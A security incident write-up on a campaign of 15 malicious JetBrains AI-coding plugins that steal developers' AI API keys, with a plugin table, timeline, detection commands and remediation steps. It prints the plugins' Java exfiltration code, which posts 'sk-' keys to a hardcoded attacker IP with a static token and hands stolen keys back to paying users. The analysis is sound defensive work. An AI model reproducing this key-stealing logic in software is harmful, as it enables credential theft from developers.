# JetBrains IDE Plugin Campaign — 15 Malicious AI Coding Plugins Steal API Keys from 70,000 Developers

**Date:** June 2026
**Ecosystem:** JetBrains Marketplace
**Severity:** High
**Type:** Malicious IDE Plugin / API Key Theft / Credential Resale Operation
**Sources:**
- [Aikido — Multiple JetBrains IDE plugins caught stealing AI keys](https://www.aikido.dev/blog/multiple-jetbrains-ide-plugins-caught-stealing-ai-keys)
- [StepSecurity — 15 Malicious JetBrains Plugins Stole AI API Keys from 70,000 Developers](https://www.stepsecurity.io/blog/jetbrains-malicious-plugins-ai-api-key-theft)

---

## Summary

Aikido Security detected a coordinated malware campaign on the JetBrains Marketplace spanning at least 8 months (October 2025 through June 2026). At least 15 IDE plugins — published under 7 different vendor accounts — share a common hidden behavior: the moment a user enters an AI provider API key (OpenAI, DeepSeek, SiliconFlow, etc.) into the plugin's settings panel, that key is silently exfiltrated to an attacker-controlled server at `39.107.60.51` over plain HTTP.

All 15 plugins functioned as advertised AI coding assistants (chat, commit messages, code review, bug finding, unit tests), which gave no external indication of malicious behavior. The plugins collectively accumulated approximately 70,000 installations, though download counts are suspected to be inflated by the vendor accounts themselves.

The campaign appears to run as a dual-revenue operation: legitimate users paste their own API keys (which are harvested), while a second group of "paying" users receives working API keys handed down from the C2 server — likely keys stolen from the first group. The attacker simultaneously collects subscription revenue and free credentials.

---

## Compromised Artifacts

| Plugin Name | Plugin ID | Downloads | First Released |
|-------------|-----------|-----------|----------------|
| DeepSeek Junit Test | org.sm.yms.toolkit | 1,121 | 2025-10-31 |
| DeepSeek Git Commit | com.json.simple.kit | 1,894 | 2025-11-01 |
| DeepSeek FindBugs | org.bug.find.tools | 1,485 | 2025-11-09 |
| DeepSeek AI Chat | org.translate.ai.simple | 1,317 | 2025-11-23 |
| DeepSeek Dev AI | com.yy.test.ai.simple | 740 | 2025-11-30 |
| DeepSeek AI Coding | com.dev.ai.toolkit | 450 | 2025-12-06 |
| AI FindBugs | com.json.view.simple | 623 | 2025-12-14 |
| AI Git Commitor | com.my.git.ai.kit | 301 | 2026-01-10 |
| AI Coder Review | org.check.ai.ds | 735 | 2026-01-11 |
| DeepSeek Coder AI | com.review.tool.code | 3,498 | 2026-01-15 |
| AI Coder Assistant | org.code.assist.dev.tool | 319 | 2026-02-01 |
| DeepSeek Code Review | com.coder.ai.dpt | 278 | 2026-04-18 |
| CodeGPT AI Assistant | com.my.code.tools | 25,571 | 2026-06-09 |
| DeepSeek AI Assist | ord.cp.code.ai.kit | 27,727 | 2026-06-10 |
| Coding Simple Tool | com.dp.git.ai.tool | ~3,931 | unknown |

**Vendor accounts:** CodePilot (mycode), StackSmith (misshewei), CodeCrafter (keteme), CodeWeaver (simpledev), JetCode (skyblue), DailyCode (dialycode), ZenCoder (947cb4c8-5db1-4cf0-8182-0aae7c433bb3)

---

## How It Worked

### Key Theft Mechanism

All 15 plugins share a substantially identical codebase, renamed and repackaged for each listing. When a user saves an AI provider API key in the plugin's settings panel, the `save()` method fires immediately — before returning control to the user:

```java
// Runs inside the settings apply() handler, the instant you save your key
public static void save(String key) {
    if (key != null && key.startsWith("sk-") && ks.add(key) && StringUtils.length(key) == 51) {
        SoftwareDto dto = new SoftwareDto();
        dto.setApiKey(key);           // your provider secret
        BaseUtil.request("key", dto); // shipped off to the attacker server
    }
}
```

The stolen key is POSTed to a hardcoded C2 server over plain HTTP with a static authentication token baked into the plugin binary:

```java
URL url = new URI("http://39.107.60.51/api/software/" + name).toURL();
connection.setRequestMethod("POST");
connection.setRequestProperty("X-Api-Key", "F48D2AA7CF341F782C1D");
byte[] input = new Gson().toJson(vo).getBytes(StandardCharsets.UTF_8);
```

There is no consent screen, no disclosure, and no mention anywhere in the UI. The key is transmitted in plaintext to `39.107.60.51` — entirely unrelated to any legitimate AI provider.

### Credential Resale Operation

The plugins also implement a "paid tier." After a user pays a small fee through the plugin's built-in donation wall, the C2 server sends a working API key back to the client. The plugin always prefers this server-supplied key over the user's own:

```java
WebResult webResult = BaseUtil.request("check", vo);
if (webResult.isSuccess()) {
    key = data.getApiKey(); // a key handed back by the attacker server
}

public static String getKey() {
    return StringUtils.defaultIfBlank(BaseState.key, Value.getKey());
}
```

The keys distributed to paying users are almost certainly the keys stolen from non-paying users — turning the campaign into a credential resale service where the attacker collects subscription revenue from one group while stealing credentials from another.

### Evasion

- Full plugin functionality is preserved — the AI features work as expected, giving users no reason to suspect malicious behavior
- The exfiltration logic is buried inside an otherwise-legitimate settings handler, making it subtle to spot in code review
- Multiple vendor account names create the appearance of independent publishers
- Fake five-star reviews inflate perceived legitimacy

---

## Timeline

| Date (UTC) | Event |
|-----------|-------|
| 2025-10-31 | First malicious plugin (DeepSeek Junit Test) published on JetBrains Marketplace |
| 2025-11 through 2026-04 | Gradual rollout of 12 more plugins across 6 vendor accounts |
| 2026-06-09 | CodeGPT AI Assistant published — 25,571 downloads |
| 2026-06-10 | DeepSeek AI Assist published — 27,727 downloads |
| 2026-06-16 | Aikido Security discloses the campaign |
| 2026-06-20 | StepSecurity publishes follow-up analysis |

---

## Detection

```bash
# Check if any of the known malicious plugin IDs are installed
# JetBrains plugin files are stored in:
# macOS:   ~/Library/Application Support/JetBrains/<IDE>/plugins/
# Windows: %APPDATA%\JetBrains\<IDE>\plugins\
# Linux:   ~/.local/share/JetBrains/<IDE>/plugins/

# List installed plugin JARs and grep for known malicious IDs
find ~/Library/Application\ Support/JetBrains -name "*.jar" | xargs -I{} jar -tf {} 2>/dev/null | grep -E "org\.sm\.yms|com\.json\.simple\.kit|org\.bug\.find|org\.translate\.ai|com\.yy\.test|com\.dev\.ai\.toolkit|com\.json\.view|com\.my\.git\.ai|org\.check\.ai\.ds|com\.review\.tool\.code|org\.code\.assist|com\.coder\.ai\.dpt|com\.my\.code\.tools|ord\.cp\.code\.ai|com\.dp\.git\.ai"

# Monitor for outbound connections to the C2 server
sudo lsof -i @39.107.60.51
netstat -an | grep "39\.107\.60\.51"

# Check for the hardcoded API key token in network traffic or plugin binaries
grep -r "F48D2AA7CF341F782C1D" ~/Library/Application\ Support/JetBrains/ 2>/dev/null

# Search for API keys (sk-*) stored in plugin state files
find ~/Library/Application\ Support/JetBrains -name "*.xml" | xargs grep -l "sk-" 2>/dev/null
```

---

## Remediation

1. Remove all listed plugins from JetBrains IDE immediately
2. Rotate any AI provider API keys that were entered into plugin settings panels — OpenAI (`sk-*`), DeepSeek, SiliconFlow, and any other providers
3. If you paid for a "tier upgrade" through any of these plugins, assume your payment method details may also be at risk
4. Check billing for AI provider accounts for unexpected usage spikes caused by attackers using stolen keys
5. Revoke and regenerate API keys at the provider level (not just locally) — deletion from the IDE does not invalidate already-exfiltrated keys
6. Report compromised keys to the relevant AI providers (OpenAI, DeepSeek, SiliconFlow) so they can block the stolen credentials

---

## Lessons Learned

- **IDE plugin ecosystems are a persistent high-value attack target**: JetBrains, VS Code (GlassWorm, GenAI RAT campaign), and browser extension stores have all been used as distribution vectors for credential stealers targeting developers.
- **Functional malware is harder to detect**: Plugins that fully deliver their advertised features give users no reason to audit network traffic or settings-handler code.
- **Manual marketplace review doesn't catch subtle exfiltration**: A small piece of logic buried inside an otherwise working plugin can slip through human review.
- **API keys are credentials**: Provider API keys grant unbounded compute access and may directly unlock proprietary models, production databases, and cloud infrastructure — treat them the same as passwords and never store them in unvetted third-party tools.
- **Multi-account campaigns multiply reach**: Seven vendor accounts make the campaign appear to represent independent publishers, reducing the chance that any single takedown collapses the entire operation.

---

## Related Incidents

- [2026-04-genai-chrome-extension-campaign.md](./2026-04-genai-chrome-extension-campaign.md) — 18 malicious AI-themed Chrome extensions stealing Claude/OpenAI/Gemini API keys
- [2026-04-glassworm-zig-dropper.md](./2026-04-glassworm-zig-dropper.md) — GlassWorm trojanized VS Code extension mass-infecting IDEs
- [2026-03-iolitelabs-vscode-backdoor.md](./2026-03-iolitelabs-vscode-backdoor.md) — Dormant VS Code publisher account hijacked for IDE-distributed backdoor
